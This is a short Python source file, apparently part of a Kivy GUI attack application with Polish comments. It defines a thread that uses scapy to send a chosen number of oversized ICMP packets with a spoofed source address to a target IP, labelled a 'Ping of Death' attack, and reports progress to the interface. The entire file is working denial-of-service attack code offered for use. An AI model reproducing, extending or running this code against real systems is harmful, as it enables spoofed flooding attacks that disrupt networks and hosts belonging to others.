from kivy.clock import Clock
from threading import Thread
from scapy.all import IP, ICMP, send

class PingOfDeathAttackThread(Thread):
    def __init__(self, app_instance, target_ip, number):
        super(PingOfDeathAttackThread, self).__init__()
        self.daemon = True
        self.app_instance = app_instance
        self.target_ip = target_ip
        self.number = number
        self.running = False
        self.packet_count = 0  # Licznik wysłanych pakietów

    def run(self):
        self.running = True
        SOURCE_IP = "192.168.0.1"
        for _ in range(self.number):
            ping_of_death = IP(src=SOURCE_IP,dst=self.target_ip) / ICMP() / ("T" * 65507)
            send(ping_of_death, verbose=0, realtime=True)

            # Aktualizuj wynik w głównym wątku Kivy
            self.packet_count += 1
            Clock.schedule_once(lambda dt: self.app_instance.update_pod_attack_result(f'Ping of Death attack sent to {self.target_ip}, Packets: {self.packet_count}'), 0)
        self.finished = True
        Clock.schedule_once(lambda dt: self.app_instance.on_attack_finished(), 0)

